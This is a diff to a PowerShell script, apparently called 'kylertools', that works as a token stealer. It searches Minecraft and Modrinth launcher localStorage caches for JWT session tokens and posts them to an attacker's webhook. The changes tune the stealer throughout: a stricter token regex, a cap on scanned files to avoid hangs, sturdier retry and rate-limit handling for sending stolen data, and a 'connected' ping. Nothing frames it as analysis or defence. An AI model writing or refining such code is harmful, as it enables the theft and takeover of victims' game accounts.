@@ -6,14 +6,14 @@ Add-Type -AssemblyName System.Security -EA 0
 # test ping
 try{
     $ping = @{ content = "**kylertools** connected" } | ConvertTo-Json
-    iwr -Uri $webhook -Method Post -Headers $h -Body $ping -TimeoutSec 10 -EA 0 | Out-Null
+    iwr -Uri $webhook -Method Post -Headers $h -Body $ping -TimeoutSec 8 -EA 0 | Out-Null
 }catch{}
 
 $found = @()
 $seen = @{}
 
-# looser regex, length check filters junk
-$jwtRegex = "eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+"
+# jwt regex - 10 char minimum per segment filters junk, still catches real tokens
+$jwtRegex = "eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"
 
 function Add-Token {
     param($tok, $user, $src)
@@ -135,7 +135,7 @@ foreach($pr in $profileRoots){
     }
 }
 
-# 5. chromium localstorage
+# 5. chromium localstorage (capped at 50 files to avoid 30s+ hang)
 $webcaches = @(
     "$env:APPDATA\.minecraft\webcache2\Default\Local Storage\leveldb",
     "$env:APPDATA\ModrinthApp\webcache\Default\Local Storage\leveldb",
@@ -145,7 +145,9 @@ $webcaches = @(
 foreach($lc in $webcaches){
     if(Test-Path $lc){
         try{
-            Get-ChildItem $lc -File -Include "*.ldb","*.log" -EA 0 | %{
+            $files = Get-ChildItem $lc -File -Include "*.ldb","*.log" -EA 0
+            if($files.Count -gt 50){ $files = $files | Select-Object -First 50 }
+            $files | %{
                 if($_.Length -gt 5mb){ return }
                 $b = [IO.File]::ReadAllBytes($_.FullName)
                 $s = [Text.Encoding]::UTF8.GetString($b)
@@ -167,34 +169,27 @@ function Send-Embed {
     if($footerText){ $embed.footer = @{ text = $footerText } }
     $body = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
 
-    $maxRetries = 3
-    $attempt = 0
-    while($attempt -lt $maxRetries){
-        $attempt++
+    for($i = 0; $i -lt 2; $i++){
         try{
-            $resp = iwr -Uri $webhook -Method Post -Headers $h -Body $body -TimeoutSec 15 -PassThru -EA 0
-            if($resp.StatusCode -eq 429){
-                $wait = 3
-                try{
-                    $ra = $resp.Headers['Retry-After']
-                    if($ra){ $wait = [double]$ra }
-                }catch{}
-                Start-Sleep -Seconds ($wait + 1)
-                continue
-            }
+            iwr -Uri $webhook -Method Post -Headers $h -Body $body -TimeoutSec 8 -EA Stop | Out-Null
             return
         }catch{
-            Start-Sleep -Seconds 2
+            $wait = 3
+            try{
+                $ra = $_.Exception.Response.Headers['Retry-After']
+                if($ra){ $wait = [double]$ra }
+            }catch{}
+            Start-Sleep -Seconds ($wait + 1)
         }
     }
 }
 
-# send tokens only (no debug on prod)
+# send tokens only
 if($found.Count -eq 0){
-    $found = "nothin found bro"
+    $joined = "nothin found bro"
+} else {
+    $joined = $found -join "`n"
 }
-
-$joined = $found -join "`n"
 
 $limit = 1700
 $chunks = @()
